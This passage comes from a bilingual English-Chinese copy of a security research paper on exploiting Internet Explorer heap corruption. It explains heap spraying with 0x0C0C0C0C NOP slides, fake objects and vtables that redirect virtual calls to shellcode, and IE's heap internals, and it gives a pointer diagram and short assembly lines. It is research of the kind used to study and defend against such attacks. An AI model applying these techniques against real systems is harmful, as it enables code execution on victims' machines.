style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>push eax<span style='mso-spacerun:yes'>                    </span>; pass C++ this pointer as the first argument<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>call dword ptr [ecx+08h]<span style='mso-spacerun:yes'>    </span>; call the function at offset 0x<st1:chmetcnv
UnitName="in" SourceValue="8" HasSpace="True" Negative="False" NumberType="1"
TCSC="0" w:st="on">8 in</st1:chmetcnv> the vtable<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
first four bytes of every C++ object contain a pointer to the vtable. To
exploit an overwritten object pointer, we need to use an address that points to
a fake object with a fake vtable that contains pointers to the shellcode. It
turns out that setting up this kind of structure in memory is not as hard as it
seems. The first step is to use a sequence of 0xC bytes for the NOP slide and
overwrite the object pointer with an address that points to the slide. The
virtual table pointer in the beginning of the fake object will be a dword from
the NOP slide that points to 0x<st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv>. The memory at this address will also
contain 0xC bytes from the NOP slide, and all virtual function pointers in the
fake vtable will point back to the slide at 0x<st1:chmetcnv UnitName="C"
SourceValue="0" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv>.
Calling any virtual function of the object will result in a call to the
shellcode.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在每个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>C++</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象的前</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>4</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个直接中都存放了一个指向虚函数表的指针。要利用虚函数表进行</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，我们需要把一个指向我们伪造的虚函数表的指针覆盖到对象的前</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>4</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个字节，然后在我们伪造的虚函数表中写入一个指向</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的指针。看上去要完成这个任务还是比较简单的。首先，我们把一串（要偶数个）</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>当成</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NOP</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>链（译注：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>0x<st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>会被当成一条指令“</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>or al, 0Ch</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>”）。然后用指向这串</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>NOP</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>链的指针覆盖掉对象的指针。这样这个</span><span
style='font-size:9.5pt;font-family:Verdana;color:#404040'> </span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>“假冒的”对象的的虚函数表就成了在</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>上的那张表，这时如果地址</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>上也写上了</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>组成的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NOP</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>链（这一点很容易做到，因为</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv TCSC="0" NumberType="1"
Negative="False" HasSpace="False" SourceValue="0" UnitName="C" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>不算太高，大量分配</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象很容易就能“占领”这个地址），那么调用任何对象的虚函数都会绕回这串</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>0x<st1:chmetcnv
TCSC="0" NumberType="1" Negative="False" HasSpace="False" SourceValue="0"
UnitName="C" w:st="on">0C</st1:chmetcnv></span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>组成的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NOP</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>链，最终执行我们的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>shellcode</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
sequence of dereferences is show below:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>如下图所示：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>object pointer<span style='mso-spacerun:yes'>   </span>--&gt;<span style='mso-spacerun:yes'>   </span>fake object<span style='mso-spacerun:yes'>   </span>--&gt;<span style='mso-spacerun:yes'>   </span>fake vtable<span style='mso-spacerun:yes'>     </span>--&gt;<span style='mso-spacerun:yes'>     </span>fake virtual function<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>addr: xxxx<span style='mso-spacerun:yes'>             </span>addr: yyyy<span style='mso-spacerun:yes'>          </span>addr: 0x<st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><span style='mso-spacerun:yes'>        </span>addr: 0x<st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>data: yyyy<span style='mso-spacerun:yes'>             </span>data: 0x<st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><span style='mso-spacerun:yes'>    </span>data: +0 0x<st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><span style='mso-spacerun:yes'>     </span>data: nop slide<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                                 </span>+4 0x<st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><span style='mso-spacerun:yes'>           </span>shellcode<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                                 </span>+8 0x<st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv
UnitName="C" SourceValue="0" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">0C</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="0"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">0C</st1:chmetcnv><o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
key observation from SkyLined's technique is that the system heap is accessible
from JavaScript code. This paper will take this idea even further and will
explore ways to completely control the heap with JavaScript.<o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>SkyLined</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的堆喷射方法之所以能够成功，关键的一点就在于在</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的脚本代码实际上是能够访问系统堆的。现在我们要走的更远一些，我们要利用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>完全控制系统的堆。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Motivation<o:p></o:p></span></h2>

<h2><span style='font-size:12.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>动机</span><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'><o:p></o:p></span></h2>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
heap spraying technique described above is surprisingly effective, but it alone
is not sufficient for reliable heap exploitation. There are two reasons for
this.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>堆喷射技术以其令人震惊的有效性而闻名于世，但出于下面这</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个原因，我认为它还是不算很可靠。</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>On
Windows XP SP2 and later systems it is easier to exploit heap corruption
vulnerabilities by overwriting application data on the heap, rather than
corrupting the internal malloc data structures. This is because the heap
allocator performs additional verification of the malloc chunk headers and the
doubly-linked lists of free blocks, which renders the standard heap
exploitation methods ineffective. As a result, many exploits use the heap
spraying technique to fill the address space with shellcode and then try to
overwrite an object or vtable pointer on the heap. The heap protection in the
operating system does not extend to the application data stored in memory. The
state of the heap is hard to predict, however, and there is no guarantee that
the overwritten memory will always contain the same data. In this case the
exploit might fail.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对于</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Windows XP SP2</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>之后的微软的操作系统来说，由于堆中内存空间的分配函数（</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>HeapAlloc</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>）在其分配的内存块（</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>chunk</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>）的管理头部中加入了</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>cookie</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>校验信息并且实现了空闲内存块的双向链表的安全删除技术，使得我们利用堆腐烂技术腐烂</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>(</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>或称破坏</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>/</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>覆盖</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>)</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>内存块的管理头部中的数据变得非常困难。这就使一些传统的堆腐烂技术一夜之间就全部落伍了。这样就迫使我们要想办法腐烂内存块中应用程序填写的数据，因为操作系统实际上是管不着应用程序到底要往</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>chunk</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中写些什么，所以根本无法把现有的一些堆保护技术运用到</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>chunk</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的数据。这样做的结果是，有许多漏洞利用程序都使用了堆喷射技术：用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>填满很大的一个内存区域，然后试图覆盖堆中的一个对象或者虚函数表的指针。但是堆中内存的状态是很难预测的，也就是说，谁也不能保证，上一次成功利用时的堆的状态会在下一次利用时能重复出现。所以有时，使用堆喷射技术的利用会失败。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>One
example of this is the <a
href="http://metasploit.com/projects/Framework/exploits.html#ie_webview_setslice">ie_webview_setslice</a>
exploit in the Metasploit Framework. It triggers a heap corruption
vulnerability repeatedly, hoping to trash enough of the heap to cause a jump to
random heap memory. It shouldn't come as a surprise that the exploit is not
always successful.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>这方面的一个例子就是</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Metasploit Framework </span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><a
href="http://metasploit.com/projects/Framework/exploits.html#ie_webview_setslice">ie_webview_setslice</a></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>漏洞的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>exploit</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>。在这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中我们不断地触发一个堆腐烂漏洞，希望以此来浪费掉足够多的堆中的空间，使程序能成功的跳到一个随机的堆中的地址。正如我们所见，这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>exploit</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>并不是每次都能成功的。</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
second problem is the trade-off between the reliability of an exploit and the
amount of system memory consumed by heap spraying. If an exploit fills the
entire address space of the browser with shellcode, any random jump would be
exploitable. Unfortunately, on systems with insufficient physical memory, heap
spraying will result in heavy use of the paging file and slow system
performance. If the user closes the browser before the heap spraying is
complete, the exploit will fail.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>堆喷射技术的另一个问题在于：你准备申请多少内存来写</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>？答案当然是“韩信点兵，多多益善”罗。我们考虑一下比较极端的情况：如果我们把整个浏览器的内存地址空间中都写满</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，那么我随便跳到任何一个地方都能激活</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
lang=EN-US style='font-size:9.5pt;font-family:Wingdings;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;color:#404040;mso-char-type:symbol;
mso-symbol-font-family:Wingdings'><span style='mso-char-type:symbol;mso-symbol-font-family:
Wingdings'>J</span></span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;color:#404040'>但是你想过没有，要消耗多少系统物理内存资源？随之而来的页交换又将带来多少额外的开销，降低多少系统资源。老实说，我要是那个倒霉的被攻击用户，不等到你的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>运行，也许就已经先不耐烦而直接关闭浏览器了。这样的攻击又怎么可能成功呢？所以到底应该申请多少内存空间写</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>shellcode</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>就变成了一件很有讲究的事了。</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>This
paper presents a solution to both of these problems, making reliable and
precise exploitation possible.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>本文为上述这</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>2</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个问题提出一个解决方案，提出一种新的可靠而且精准的利用方法。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h2><span lang=EN-US style='font-size:12.5pt;font-family:Verdana'>Internet
Explorer heap internals<o:p></o:p></span></h2>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Overview<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>There
are three main components of Internet Explorer that allocate memory typically
corrupted by browser heap vulnerabilities. The first one is the MSHTML.DLL
library, responsible for managing memory for HTML elements on the currently
displayed page. It allocates memory during the initial rendering of the page,
and during any subsequent DHTML manipulations. The memory is allocated from the
default process heap and is freed when a page is closed or HTML elements are
destroyed.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>IE</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中（本文中涉及的浏览器堆腐烂漏洞）担负分配内存任务的主要是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>3</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个组件。第一个是</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>MSHTML.DLL</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>这个动态链接库，它负责管理用于当前显示的页（以及随之而来的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>DHTML</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>操作）中</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>HTML</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>元素的内存空间的分配和回收。这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>DLL</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在进程默认堆中分配内存空间，并且在当前页面被关闭，或者</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>HTML</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>元素析构（</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>destroy</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>）时回收空间。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
second component that manages memory is the JavaScript engine in JSCRIPT.DLL.
Memory for new JavaScript objects is allocated from a dedicated JavaScript
heap, with the exception of strings, which are allocated from the default
process heap. Unreferenced objects are destroyed by the garbage collector,
which runs when the total memory consumption or the number of objects exceed a
certain threshold. The garbage collector can also be triggered explicitly by
calling the CollectGarbage() function.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>第二个用于管理内存空间的组件是</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>JSCRIPT.DLL</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>引擎。但我们</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>new</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>一个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象时，这个对象将被分配到一个专门的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
